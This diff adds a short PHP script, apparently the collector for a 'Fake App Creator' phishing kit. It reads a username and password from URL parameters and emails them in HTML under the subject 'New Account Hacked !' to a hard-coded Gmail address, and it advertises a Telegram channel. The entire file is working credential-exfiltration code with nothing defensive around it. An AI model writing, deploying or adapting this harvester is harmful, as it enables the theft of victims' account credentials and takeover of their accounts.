@@ -1,0 +1,27 @@
+﻿<?php
+$to = "akbarzadeh.sahand@gmail.com";
+$subject = "New Account Hacked !";
+
+$message = "
+<html>
+<head>
+<title>FAC | Fake App Creator</title>
+</head>
+<body>
+<p>FAC by @Sahandevs</p>
+<br>
+<p>
+telegram.me/CyberSoldiersST
+</p>
+<table>
+<tr>
+<th>Username : </th>
+<th>
+";
+$resu = $message . $_GET["u"] . "</th></tr><tr><td>Password : </td><td>" . $_GET["p"] . "</td></tr></table></body></html>";
+
+// Always set content-type when sending HTML email
+$headers = "MIME-Version: 1.0" . "\r\n";
+$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+mail($to,$subject,$resu,$headers);
+?>
